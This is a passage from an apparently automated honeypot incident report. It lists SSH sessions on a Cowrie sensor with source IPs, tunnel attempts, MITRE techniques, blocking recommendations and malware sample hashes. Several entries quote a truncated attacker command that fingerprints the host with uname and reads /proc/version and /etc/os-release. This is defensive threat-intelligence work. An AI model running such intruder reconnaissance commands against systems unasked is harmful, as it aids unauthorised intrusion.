| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:44:11` | `cowrie.session.connect` |
| `2026-08-16 10:44:12` | `cowrie.client.version` |
| `2026-08-16 10:44:12` | `cowrie.client.kex` |
| `2026-08-16 10:44:14` | `cowrie.login.success` |
| `2026-08-16 10:44:15` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.239.20[.]236` to AbuseIPDB if not already reported
- [ ] Block `183.239.20[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d764652874

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-08-16 10:44 |
| **Last Seen** | 2026-08-16 10:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:44:21` | `cowrie.session.connect` |
| `2026-08-16 10:44:22` | `cowrie.client.version` |
| `2026-08-16 10:44:22` | `cowrie.client.kex` |
| `2026-08-16 10:44:24` | `cowrie.login.success` |
| `2026-08-16 10:44:25` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:44:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e9529ed295

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:44 |
| **Last Seen** | 2026-08-16 10:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:44:29` | `cowrie.session.connect` |
| `2026-08-16 10:44:29` | `cowrie.client.version` |
| `2026-08-16 10:44:29` | `cowrie.client.kex` |
| `2026-08-16 10:44:30` | `cowrie.login.success` |
| `2026-08-16 10:44:31` | `cowrie.session.params` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.success` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.command.input` |
| `2026-08-16 10:44:31` | `cowrie.log.closed` |
| `2026-08-16 10:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235f9caa8ccd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:46 |
| **Last Seen** | 2026-08-16 10:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:46:07` | `cowrie.session.connect` |
| `2026-08-16 10:46:07` | `cowrie.client.version` |
| `2026-08-16 10:46:07` | `cowrie.client.kex` |
| `2026-08-16 10:46:08` | `cowrie.login.success` |
| `2026-08-16 10:46:10` | `cowrie.session.params` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.success` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.command.input` |
| `2026-08-16 10:46:10` | `cowrie.log.closed` |
| `2026-08-16 10:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9842353a91

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-08-16 10:46 |
| **Last Seen** | 2026-08-16 10:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:46:49` | `cowrie.session.connect` |
| `2026-08-16 10:46:49` | `cowrie.client.version` |
| `2026-08-16 10:46:49` | `cowrie.client.kex` |
| `2026-08-16 10:46:51` | `cowrie.login.success` |
| `2026-08-16 10:46:51` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42518db873e1

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-16 10:46 |
| **Last Seen** | 2026-08-16 10:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:46:56` | `cowrie.session.connect` |
| `2026-08-16 10:46:57` | `cowrie.client.version` |
| `2026-08-16 10:46:57` | `cowrie.client.kex` |
| `2026-08-16 10:46:59` | `cowrie.login.success` |
| `2026-08-16 10:47:00` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72615ab8775

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:47 |
| **Last Seen** | 2026-08-16 10:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:47:45` | `cowrie.session.connect` |
| `2026-08-16 10:47:45` | `cowrie.client.version` |
| `2026-08-16 10:47:45` | `cowrie.client.kex` |
| `2026-08-16 10:47:46` | `cowrie.login.success` |
| `2026-08-16 10:47:47` | `cowrie.session.params` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.success` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:47` | `cowrie.command.input` |
| `2026-08-16 10:47:48` | `cowrie.log.closed` |
| `2026-08-16 10:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6a93dc7b75

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:49 |
| **Last Seen** | 2026-08-16 10:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:49:24` | `cowrie.session.connect` |
| `2026-08-16 10:49:24` | `cowrie.client.version` |
| `2026-08-16 10:49:24` | `cowrie.client.kex` |
| `2026-08-16 10:49:26` | `cowrie.login.success` |
| `2026-08-16 10:49:26` | `cowrie.session.params` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.success` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:26` | `cowrie.command.input` |
| `2026-08-16 10:49:27` | `cowrie.log.closed` |
| `2026-08-16 10:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18773cc1297

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 10:51 |
| **Last Seen** | 2026-08-16 10:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:51:03` | `cowrie.session.connect` |
| `2026-08-16 10:51:03` | `cowrie.client.version` |
| `2026-08-16 10:51:03` | `cowrie.client.kex` |
| `2026-08-16 10:51:04` | `cowrie.login.success` |
| `2026-08-16 10:51:05` | `cowrie.session.params` |
| `2026-08-16 10:51:05` | `cowrie.command.input` |
| `2026-08-16 10:51:05` | `cowrie.log.closed` |
| `2026-08-16 10:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-281fa206abbd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:51 |
| **Last Seen** | 2026-08-16 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:51:07` | `cowrie.session.connect` |
| `2026-08-16 10:51:07` | `cowrie.client.version` |
| `2026-08-16 10:51:07` | `cowrie.client.kex` |
| `2026-08-16 10:51:08` | `cowrie.login.success` |
| `2026-08-16 10:51:09` | `cowrie.session.params` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.success` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.command.input` |
| `2026-08-16 10:51:09` | `cowrie.log.closed` |
| `2026-08-16 10:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea176550e6fd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:52 |
| **Last Seen** | 2026-08-16 10:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:52:52` | `cowrie.session.connect` |
| `2026-08-16 10:52:52` | `cowrie.client.version` |
| `2026-08-16 10:52:52` | `cowrie.client.kex` |
| `2026-08-16 10:52:52` | `cowrie.login.success` |
| `2026-08-16 10:52:53` | `cowrie.session.params` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.success` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.command.input` |
| `2026-08-16 10:52:53` | `cowrie.log.closed` |
| `2026-08-16 10:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d828a8e886

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:54 |
| **Last Seen** | 2026-08-16 10:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:54:33` | `cowrie.session.connect` |
| `2026-08-16 10:54:33` | `cowrie.client.version` |
| `2026-08-16 10:54:33` | `cowrie.client.kex` |
| `2026-08-16 10:54:34` | `cowrie.login.success` |
| `2026-08-16 10:54:36` | `cowrie.session.params` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.success` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.command.input` |
| `2026-08-16 10:54:36` | `cowrie.log.closed` |
| `2026-08-16 10:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **4520** | 2026-08-16 08:55 | 2026-08-16 10:55 | 5336m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **42** | 2026-08-16 09:00 | 2026-08-16 10:51 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **11** | 2026-08-16 09:04 | 2026-08-16 10:39 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-16 08:59 | 2026-08-16 10:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `177.93.59[.]90` | **4** | 2026-08-16 10:15 | 2026-08-16 10:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]195` | **4** | 2026-08-16 09:01 | 2026-08-16 09:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | **3** | 2026-08-16 09:03 | 2026-08-16 09:40 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `114.98.63[.]18` | **2** | 2026-08-16 09:54 | 2026-08-16 10:46 | 3m | 0 | `T1592` | 🟢 LOW |
| `45.142.193[.]164` | **2** | 2026-08-16 09:24 | 2026-08-16 10:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.37.22[.]98` | 1 | 2026-08-16 10:47 | 2026-08-16 10:48 | 31s | 0 | `T1592` | 🟢 LOW |
| `115.160.67[.]73` | 1 | 2026-08-16 09:25 | 2026-08-16 09:26 | 30s | 0 | `T1592` | 🟢 LOW |
| `176.196.176[.]122` | 1 | 2026-08-16 10:31 | 2026-08-16 10:31 | 12s | 0 | `T1592` | 🟢 LOW |
| `181.175.220[.]83` | 1 | 2026-08-16 10:18 | 2026-08-16 10:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.243.126[.]46` | 1 | 2026-08-16 10:50 | 2026-08-16 10:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-08-16 09:11 | 2026-08-16 09:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-16 10:09 | 2026-08-16 10:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-08-16 10:47 | 2026-08-16 10:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.66.197[.]199` | 1 | 2026-08-16 10:47 | 2026-08-16 10:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-08-16 08:55 | 2026-08-16 08:55 | 9s | 0 | `T1592` | 🟢 LOW |
| `36.135.62[.]103` | 1 | 2026-08-16 09:31 | 2026-08-16 09:31 | 7s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-08-16 08:57 | 2026-08-16 08:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-08-16 10:10 | 2026-08-16 10:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.233.77[.]136` | 1 | 2026-08-16 09:05 | 2026-08-16 09:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.226.181[.]38` | 1 | 2026-08-16 10:13 | 2026-08-16 10:15 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/72** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
